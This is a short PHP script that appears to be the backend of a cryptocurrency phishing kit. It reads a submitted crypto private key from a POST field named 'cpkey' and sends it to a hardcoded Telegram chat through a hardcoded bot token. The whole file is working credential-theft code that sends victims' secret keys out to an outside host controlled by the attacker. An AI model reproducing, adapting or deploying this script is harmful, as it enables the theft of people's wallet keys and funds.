<?php

$token = "1957232453:AAEQRjog5KDxAccOBEwH3keU0BM4Vn_YVCg";
$chatid = "-597148385";
$cryptoprivatekey = $_POST['cpkey'];

sendMessage($chatid, $cryptoprivatekey , $token);

function sendMessage($chatID, $messaggio, $token) {
    echo "sending message to " . $chatID . "\n";

    $url = "https://api.telegram.org/bot" . $token . "/sendMessage?chat_id=" . $chatID;
    $url = $url . "&text=" . urlencode($messaggio);
    $ch = curl_init();
    $optArray = array(
            CURLOPT_URL => $url,
            CURLOPT_RETURNTRANSFER => true
    );
    curl_setopt_array($ch, $optArray);
    $result = curl_exec($ch);
    curl_close($ch);
    return $result;
}


?>